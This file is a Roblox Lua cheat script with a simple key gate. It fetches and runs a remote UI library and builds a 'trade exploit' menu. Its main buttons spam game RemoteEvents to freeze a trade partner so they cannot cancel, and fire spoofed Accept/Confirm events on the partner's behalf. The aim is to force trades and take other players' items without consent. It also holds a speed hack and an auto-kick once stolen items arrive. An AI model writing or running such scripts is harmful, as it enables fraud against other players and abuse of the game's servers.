local CorrectKey = "aru"

-- 1. FAST KEY SYSTEM
local KeyGui = Instance.new("ScreenGui", game.CoreGui)
local KeyMain = Instance.new("Frame", KeyGui)
KeyMain.Size = UDim2.new(0, 300, 0, 160)
KeyMain.Position = UDim2.new(0.5, -150, 0.5, -80)
KeyMain.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Instance.new("UICorner", KeyMain)

local KeyInput = Instance.new("TextBox", KeyMain)
KeyInput.PlaceholderText = "ENTER KEY..."
KeyInput.Size = UDim2.new(0.8, 0, 0, 40)
KeyInput.Position = UDim2.new(0.1, 0, 0.25, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
KeyInput.TextColor3 = Color3.new(1,1,1)

local KeyCheck = Instance.new("TextButton", KeyMain)
KeyCheck.Text = "ACTIVATE EXPLOIT"
KeyCheck.Size = UDim2.new(0.8, 0, 0, 40)
KeyCheck.Position = UDim2.new(0.1, 0, 0.6, 0)
KeyCheck.BackgroundColor3 = Color3.fromRGB(80, 0, 200)
KeyCheck.TextColor3 = Color3.new(1,1,1)

KeyCheck.MouseButton1Click:Connect(function()
    if KeyInput.Text == CorrectKey then
        KeyGui:Destroy()

        -- 2. LOAD HUB
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("ARHAM'S DUAL FORCE", "DarkTheme")
        local MainTab = Window:NewTab("Trade Exploits")
        local ForceSection = MainTab:NewSection("Dual-Force Controls")

        -- FIND TARGET FUNCTION
        local function GetTradeTarget()
            for _, p in pairs(game.Players:GetPlayers()) do
                if p ~= game.Players.LocalPlayer and p:FindFirstChild("TradingWith") then
                    return p
                end
            end
            return nil
        end

        -- THE TWO CORE BUTTONS
        
        -- BUTTON 1: FREEZE OTHER PLAYER
        ForceSection:NewButton("FREEZE OTHER PLAYER", "Stops them from canceling", function()
            local RS = game:GetService("ReplicatedStorage")
            local Target = GetTradeTarget()
            
            game:GetService("RunService").Heartbeat:Connect(function()
                for _, v in pairs(RS:GetDescendants()) do
                    if v:IsA("RemoteEvent") and (v.Name:find("Trade") or v.Name:find("Remote")) then
                        -- Spamming "Processing" state to the target
                        v:FireServer("Update", {["Status"] = "Busy", ["Target"] = Target})
                    end
                end
            end)
            Library:Notify("FROZEN", "Other player's trade UI is now locked.", Color3.new(1,0,0))
        end)

        -- BUTTON 2: FORCE DUAL ACCEPT
        ForceSection:NewButton("FORCE DUAL ACCEPT", "Accepts for YOU and THE OTHER PLAYER", function()
            local RS = game:GetService("ReplicatedStorage")
            local Target = GetTradeTarget()
            
            task.spawn(function()
                while task.wait() do
                    for _, v in pairs(RS:GetDescendants()) do
                        if v:IsA("RemoteEvent") and (v.Name:find("Trade") or v.Name:find("Remote")) then
                            -- Fire accept for yourself
                            v:FireServer("Accept", game.Players.LocalPlayer)
                            -- Fire accept spoofing the target
                            if Target then
                                v:FireServer("Accept", Target)
                                v:FireServer("Confirm", Target)
                            end
                            -- Universal Confirm
                            v:FireServer("Confirm", true)
                        end
                    end
                end
            end)
            Library:Notify("FORCING", "Attempting Dual-Accept Bypass...", Color3.new(0,1,0))
        end)

        -- MISC FEATURES
        local MiscTab = Window:NewTab("Misc")
        MiscTab:NewSection("Movement"):NewSlider("WalkSpeed", "Speed", 500, 16, function(s) 
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s 
        end)
        
        MiscTab:NewSection("Protection"):NewToggle("Auto-Kick on Steal", "Safety", function(s)
            _G.AK = s
            game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function() 
                if _G.AK then task.wait(0.05); game.Players.LocalPlayer:Kick("BRAINROT SECURED") end 
            end)
        end)

        Library:Notify("SYSTEM LOADED", "Dual Force Ready.", Color3.new(0.5, 0, 1))
    else
        KeyInput.Text = ""; KeyInput.PlaceholderText = "INVALID KEY"
    end
end)
